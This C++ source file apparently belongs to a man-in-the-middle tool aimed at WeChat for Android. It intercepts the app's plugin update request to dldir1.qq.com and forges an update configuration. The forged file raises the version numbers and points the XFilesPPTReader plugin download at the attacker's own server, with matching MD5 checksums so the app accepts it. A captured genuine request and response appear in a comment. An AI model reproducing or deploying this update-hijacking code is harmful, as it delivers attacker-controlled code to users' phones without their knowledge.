#include "WechatPlugin.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../Public.h"
#include "sslpublic.h"

//https://dldir1.qq.com//weixin/android/wxweb/plugin/pluginUpdateConfig.xml
int WechatPlugin::iswechatPlugin(string url, string host) {
	if ( (host.find("dldir1.qq.com") != -1) && (url.find("/weixin/android/wxweb/plugin/pluginUpdateConfig.xml") != -1) ) {
		return TRUE;
	}

	return FALSE;
}


int WechatPlugin::replyWechatPlugin(string username, char * dstbuf, int bufdatasize,int dstbuflimit) {
	int ret = 0;

	int configver = 999;
	int pluginver = 998;
	int jsver = 997;

	char szrespformat[] =
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: application/xml\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * szxmlformat =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
		"<pluginUpdateConfig xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" checkvalue=\"%s\" configVer=\"%u\">\r\n%s";

	char * szxmlbodyformat =
		"<Plugins>\r\n"
		"<PluginInfo fullurl=\"http://dldir1.qq.com/weixin/android/wxweb/plugin/xwebplugin_fullscreen_video_D0411B804_OMwUJ.js\" version=\"%u\" period=\"0\" forbidDeviceRegex=\"\" md5=\"6505D8C7947B136563BFB8669F66A9C7\" useCellular=\"true\" useCdn=\"true\" grayMin=\"1\" grayMax=\"10000\" name=\"FullScreenVideo\">\r\n"
		"<PluginPatches/>\r\n"
		"</PluginInfo>\r\n"
		"<PluginInfo fullurl=\"http://%s/%s\" sdkMin=\"190502\" version=\"%u\" period=\"0\" forbidDeviceRegex=\"\" md5=\"%s\" useCdn=\"true\" grayMin=\"1\" grayMax=\"10000\" name=\"XFilesPPTReader\">\r\n"
		"<PluginPatches/>\r\n"
		"</PluginInfo>\r\n"
		"</Plugins>\r\n"
		"</pluginUpdateConfig>";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string filename = Public::getUserPluginPath(username) + WEIXIN_ANDROID_XFILESPPT_FILENAME;
	char szfilemd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	ret = CryptoUtils::getUpdateFileMd5(filename, szfilemd5, hexmd5, FALSE);

	char szxmlbody[0x2000];
	int xmlbodysize = sprintf_s(szxmlbody, 0x2000, szxmlbodyformat,
		jsver,
		strip.c_str(), WEIXIN_ANDROID_XFILESPPT_FILENAME,pluginver,szfilemd5);

	char szxmlbodymd5[256] = { 0 };
	ret = CryptoUtils::getDataMd5(szxmlbody, xmlbodysize, szxmlbodymd5, FALSE);

	char szxml[0x2000];
	int xmlsize = sprintf_s(szxml, 0x2000, szxmlformat, szxmlbodymd5, configver, szxmlbody);

	int packsize = sprintf_s(dstbuf, dstbuflimit, szrespformat, xmlsize, szxml);

	//FileOper::fileWriter("wexinconfig.xml", lpbuffer, packsize);

	return packsize;
}

/*
GET /weixin/android/wxweb/plugin/pluginUpdateConfig.xml HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.3.1.0.PDGCNXM)
Host: dldir1.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Last-Modified: Tue, 09 Jul 2019 03:16:04 GMT
Content-Encoding: gzip
Server: nws_4.2.1_midcache
Date: Tue, 09 Jul 2019 03:22:20 GMT
Cache-Control: max-age=600
Expires: Tue, 09 Jul 2019 03:32:20 GMT
Content-Type: application/xml
Content-Length: 488
Accept-Ranges: bytes
X-NWS-LOG-UUID: 13598409274967398640
X-NWS-UUID-VERIFY: f1e28719a81ae5d032401dd5ffd0f60a
Connection: keep-alive
X-Cache-Lookup: Cache Hit

<?xml version="1.0" encoding="utf-8"?>
<pluginUpdateConfig configVer="22" checkvalue="EA8C5D755E8C79DCBEEA8A1707009235" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<Plugins>
<PluginInfo fullurl="http://dldir1.qq.com/weixin/android/wxweb/plugin/xwebplugin_fullscreen_video_D0411B804_OMwUJ.js" version="8" period="0" forbidDeviceRegex="" md5="6505D8C7947B136563BFB8669F66A9C7" useCellular="true" useCdn="true" grayMin="1" grayMax="10000" name="FullScreenVideo">
<PluginPatches/>
</PluginInfo>
<PluginInfo fullurl="http://dldir1.qq.com/weixin/android/wxweb/plugin/xwebplugin_pptreader_D0705B79V215_9Q5e9.zip" sdkMin="190502" version="215" period="0" forbidDeviceRegex="" md5="C84CD2AB1D2810F78BFFBC0E820AF06D" useCdn="true" grayMin="1" grayMax="100" name="XFilesPPTReader">
<PluginPatches/>
</PluginInfo>
</Plugins>
</pluginUpdateConfig>
*/